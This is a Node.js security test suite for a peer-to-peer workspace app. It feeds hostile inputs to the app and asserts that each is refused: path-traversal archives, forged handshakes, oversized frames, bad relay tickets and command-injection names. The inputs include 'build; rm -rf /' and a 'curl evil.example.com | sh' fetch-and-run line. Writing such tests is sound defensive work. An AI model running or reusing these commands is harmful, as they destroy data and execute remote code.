/**
 * Everything a computer somewhere else might try.
 *
 * The rest of the suite asks whether things work. This one asks whether they
 * can be made to do something they should not, and each test is written as the
 * attempt rather than as the rule — because a rule written down is a rule
 * somebody can argue with and an attempt that fails is not.
 *
 * The threat is specific and worth naming: **the other end of a connection is
 * not trusted.** It may be a computer of yours that has been taken over, a
 * relay in the middle, or somebody who found the port. Every one of these
 * arrives having proved which key it holds, and none of them arrives having
 * earned anything.
 */

import { test, describe, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { createServer, createConnection } from 'node:net';
import { mkdtemp, rm, mkdir, writeFile, readFile } from 'node:fs/promises';
import { existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { randomBytes } from 'node:crypto';
import { PassThrough } from 'node:stream';

const here = dirname(fileURLToPath(import.meta.url));
let root, peers, parcel, members, remote, relayModule, device;

before(async () => {
  root = await mkdtemp(join(tmpdir(), 'viberant-hostile-'));
  await mkdir(join(root, 'home'), { recursive: true });
  process.env.USERPROFILE = join(root, 'home');
  process.env.HOME = join(root, 'home');

  peers = await import('../peers.mjs');
  parcel = await import('../parcel.mjs');
  members = await import('../members.mjs');
  remote = await import('../remote.mjs');
  relayModule = await import('../relay.mjs');
  device = await import('../device.mjs');
});

after(async () => {
  remote.closeEverything();
  await rm(root, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 });
});

/** A parcel built by hand, so it can be built wrong on purpose. */
function aParcelSaying(lines) {
  const { createGzip } = require_zlib();
  const out = new PassThrough();
  const squashed = createGzip();
  squashed.pipe(out);
  for (const line of lines) squashed.write(typeof line === 'string' ? line : line);
  squashed.end();
  return out;
}
function require_zlib() { return zlib; }
let zlib;
before(async () => { zlib = await import('node:zlib'); });

describe('a parcel from somewhere else cannot escape the folder it lands in', () => {
  test('a path climbing out of the folder is refused, and writes nothing', async () => {
    const escaped = join(root, 'escaped.txt');
    const into = join(root, 'landing-1');

    const evil = aParcelSaying([
      `${JSON.stringify({ v: 2, totalFiles: 1, totalDirs: 0, totalBytes: 5 })}\n`,
      `${JSON.stringify({ path: '../../escaped.txt', size: 5 })}\n`,
      'hello',
      `${JSON.stringify({ end: true, files: 1, dirs: 0, bytes: 5 })}\n`,
    ]);

    const out = await parcel.unwrap(evil, into);
    assert.equal(out.ok, false);
    assert.equal(existsSync(escaped), false, 'a parcel wrote outside the folder it was given');
  });

  test('an absolute path is refused too', async () => {
    const into = join(root, 'landing-2');
    const target = process.platform === 'win32' ? 'C:/Windows/viberant-was-here.txt' : '/tmp/viberant-was-here.txt';

    const evil = aParcelSaying([
      `${JSON.stringify({ v: 2, totalFiles: 1, totalDirs: 0, totalBytes: 3 })}\n`,
      `${JSON.stringify({ path: target, size: 3 })}\n`,
      'abc',
      `${JSON.stringify({ end: true, files: 1, dirs: 0, bytes: 3 })}\n`,
    ]);

    await parcel.unwrap(evil, into);
    assert.equal(existsSync(target), false);
  });

  test('a folder climbing out is refused', async () => {
    const into = join(root, 'landing-3');
    const evil = aParcelSaying([
      `${JSON.stringify({ v: 2, totalFiles: 0, totalDirs: 1, totalBytes: 0 })}\n`,
      `${JSON.stringify({ dir: '../../made-outside' })}\n`,
      `${JSON.stringify({ end: true, files: 0, dirs: 1, bytes: 0 })}\n`,
    ]);

    await parcel.unwrap(evil, into);
    assert.equal(existsSync(join(root, 'made-outside')), false);
  });

  test('a parcel that lies about its own size is refused whole', async () => {
    const into = join(root, 'landing-4');
    const evil = aParcelSaying([
      `${JSON.stringify({ v: 2, totalFiles: 2, totalDirs: 0, totalBytes: 100 })}\n`,
      `${JSON.stringify({ path: 'only-one.txt', size: 5 })}\n`,
      'hello',
      `${JSON.stringify({ end: true, files: 2, dirs: 0, bytes: 100 })}\n`,
    ]);

    const out = await parcel.unwrap(evil, into);
    assert.equal(out.ok, false, 'a parcel whose story does not add up was accepted');
    assert.equal(existsSync(into), false);
  });

  test('nonsense in place of a parcel is refused rather than guessed at', async () => {
    const into = join(root, 'landing-5');
    const junk = new PassThrough();
    junk.end(randomBytes(4096));

    const out = await parcel.unwrap(junk, into);
    assert.equal(out.ok, false);
    assert.ok(out.sentence);
  });

  test('a name this computer will not accept does not become a wrong file', async () => {
    const into = join(root, 'landing-6');
    const evil = aParcelSaying([
      `${JSON.stringify({ v: 2, totalFiles: 1, totalDirs: 0, totalBytes: 3 })}\n`,
      `${JSON.stringify({ path: 'a\u0000b.txt', size: 3 })}\n`,
      'abc',
      `${JSON.stringify({ end: true, files: 1, dirs: 0, bytes: 3 })}\n`,
    ]);
    const out = await parcel.unwrap(evil, into);
    assert.equal(out.ok, false);
  });
});

describe('a computer that cannot prove who it is gets nothing', () => {
  test('a stranger arriving is not let in by the listener', async () => {
    await members.forgetAll();
    const ws = (await members.create({
      name: 'Atlas', owner: 'danni', device: await device.card(),
    })).workspace;

    // The gate the listener uses, asked about somebody nobody added.
    const allow = (who) => !!ws.devices?.[who.deviceId] && !members.isRevoked(ws, who.deviceId);
    assert.equal(allow({ deviceId: 'a-stranger' }), false);
    assert.equal(allow(await device.card()), true);
  });

  test('a handshake that never finishes leaves nothing behind', async () => {
    const server = createServer();
    await new Promise((r) => server.listen(0, '127.0.0.1', r));
    const port = server.address().port;

    const theirs = new Promise((done) => {
      server.once('connection', async (socket) => done(await peers.greet(socket)));
    });

    // Connect, say nothing, hang up.
    const socket = createConnection({ port, host: '127.0.0.1' });
    await new Promise((r) => socket.once('connect', r));
    socket.destroy();

    assert.equal(await theirs, null);
    server.close();
  });

  test('a greeting with no proof in it does not become a conversation', async () => {
    const server = createServer();
    await new Promise((r) => server.listen(0, '127.0.0.1', r));
    const port = server.address().port;

    const theirs = new Promise((done) => {
      server.once('connection', async (socket) => done(await peers.greet(socket)));
    });

    const socket = createConnection({ port, host: '127.0.0.1' });
    await new Promise((r) => socket.once('connect', r));
    const me = await device.card();
    socket.write(peers.__testOnly.framed(Buffer.from(JSON.stringify({
      hello: me, challenge: 'x',
    }))));
    // A wrong proof, rather than none, which is the more interesting attempt.
    socket.write(peers.__testOnly.framed(Buffer.from(JSON.stringify({
      proof: Buffer.from('not a signature').toString('base64'),
    }))));

    assert.equal(await theirs, null);
    socket.destroy();
    server.close();
  });

  test('a frame bigger than anything this sends is refused rather than allocated', () => {
    const reader = peers.frames();
    const huge = Buffer.alloc(4);
    huge.writeUInt32BE(3_000_000_000);
    assert.throws(() => reader.take(huge), /larger than anything this sends/,
      'a length somebody else chose is a way to ask this computer for memory');
  });
});

describe('a relay is not a way in', () => {
  let running;
  before(async () => {
    running = relayModule.start({ port: 0, host: '127.0.0.1' });
    await running.listening;
  });
  after(async () => { await running?.stop(); });

  test('a ticket that is not a ticket is refused', async () => {
    const port = running.server.address().port;
    for (const bad of ['../../etc/passwd', '<script>', 'a'.repeat(500), '', 'NOT-HEX']) {
      const out = await relayModule.dialRelay({
        host: '127.0.0.1', port, ticket: bad, within: 1500,
      });
      assert.equal(out, null, `the relay accepted "${bad.slice(0, 20)}"`);
    }
  });

  test('rubbish where a ticket should be closes the connection', async () => {
    const port = running.server.address().port;
    const socket = createConnection({ host: '127.0.0.1', port });
    await new Promise((r) => socket.once('connect', r));

    socket.write(peers.__testOnly.framed(Buffer.from('this is not json at all')));
    const closed = await new Promise((r) => {
      socket.once('close', () => r(true));
      setTimeout(() => r(false), 2000);
    });
    assert.equal(closed, true);
  });

  test('what it counts is numbers, and never who or what', () => {
    const counted = running.counted;
    assert.deepEqual(Object.keys(counted).sort(), ['bytes', 'open', 'paired', 'refused']);
    for (const v of Object.values(counted)) assert.equal(typeof v, 'number');
  });
});

describe('nothing runs because somebody asked nicely', () => {
  const aDevice = (id, name) => ({
    deviceId: id, signPublic: `s-${id}`, agreePublic: `a-${id}`, displayName: name,
  });

  test('a member cannot open a terminal, however the request is dressed up', async () => {
    await members.forgetAll();
    const made = await members.create({ name: 'Atlas', owner: 'danni', device: aDevice('mine', 'Mine') });
    const asked = await members.invite({ workspace: made.workspace, by: 'danni' });
    await members.redeem({
      workspace: await members.current(), code: asked.code, person: 'rahul', device: aDevice('theirs', 'Theirs'),
    });
    const ws = await members.current();

    // Every shape of the same attempt.
    for (const attempt of [
      { workspace: ws, fromDevice: 'theirs', kind: remote.TERMINAL },
      { workspace: { ...ws, devices: { ...ws.devices, theirs: { ...ws.devices.theirs, trusted: true } } }, fromDevice: 'theirs', kind: remote.TERMINAL },
    ]) {
      // The second one is a workspace object the caller made up with `trusted`
      // set. It fails because the role does not allow it either — two things
      // have to agree, which is why forging one is not enough.
      assert.equal(remote.mayAsk(attempt).ok, false);
    }
  });

  test('a name that is not one of the project own commands is refused', async () => {
    const project = join(root, 'p');
    await mkdir(project, { recursive: true });
    await writeFile(join(project, 'package.json'), JSON.stringify({
      name: 'p', scripts: { build: 'node -e "0"' },
    }));

    await members.forgetAll();
    const made = await members.create({ name: 'Atlas', owner: 'danni', device: aDevice('mine', 'Mine') });

    for (const evil of [
      'build; rm -rf /',
      '../../../bin/sh',
      'build && curl evil.example.com | sh',
      '__proto__',
      'constructor',
    ]) {
      const out = await remote.doNamed({
        workspace: made.workspace, fromDevice: 'mine', whoName: 'danni', dir: project, name: evil,
      });
      assert.equal(out.ok, false, `"${evil}" was accepted as a command name`);
    }
  });

  test('a project that is not on this computer is not reached for', async () => {
    await members.forgetAll();
    const made = await members.create({ name: 'Atlas', owner: 'danni', device: aDevice('mine', 'Mine') });
    const out = await remote.doNamed({
      workspace: made.workspace,
      fromDevice: 'mine',
      whoName: 'danni',
      dir: process.platform === 'win32' ? 'C:/Windows/System32' : '/etc',
      name: 'build',
    });
    assert.equal(out.ok, false, 'it went looking in a folder that is not a project of yours');
  });
});

describe('nothing anywhere writes down a key', () => {
  test('no module logs, prints or stores a private half', async () => {
    const files = ['device.mjs', 'peers.mjs', 'relay.mjs', 'plane.mjs', 'anywhere.mjs',
      'members.mjs', 'remote.mjs', 'machines.mjs', 'sync.mjs', 'snapshots.mjs'];

    for (const name of files) {
      const source = await readFile(join(here, '..', name), 'utf8');
      const code = source.replace(/\/\*[\s\S]*?\*\//g, ' ').replace(/^\s*\/\/.*$/gm, ' ');

      assert.equal(/console\.(log|error|warn|info|debug)/.test(code), false,
        `${name} prints, and the only interesting thing near it is a key`);

      for (const never of [/signPrivate/, /agreePrivate/, /privateKey\s*\.export/]) {
        if (name === 'device.mjs') continue;
        assert.equal(never.test(code), false, `${name} touches ${never}`);
      }
    }
  });

  test('what a device tells the world has no private half in it', async () => {
    const said = JSON.stringify(await device.card());
    const held = JSON.parse(await readFile(device.KEY_FILE, 'utf8'));
    for (const secret of [held.signPrivate, held.agreePrivate]) {
      assert.equal(said.includes(secret), false);
    }
  });

  test('what a workspace keeps on disk has no invite code in it', async () => {
    await members.forgetAll();
    const made = await members.create({
      name: 'Atlas', owner: 'danni', device: await device.card(),
    });
    const asked = await members.invite({ workspace: made.workspace, by: 'danni' });

    const onDisk = await readFile(members.BOOK_FILE, 'utf8');
    assert.equal(onDisk.includes(asked.code), false);
    assert.equal(onDisk.includes(asked.code.replace('-', '')), false);
  });
});
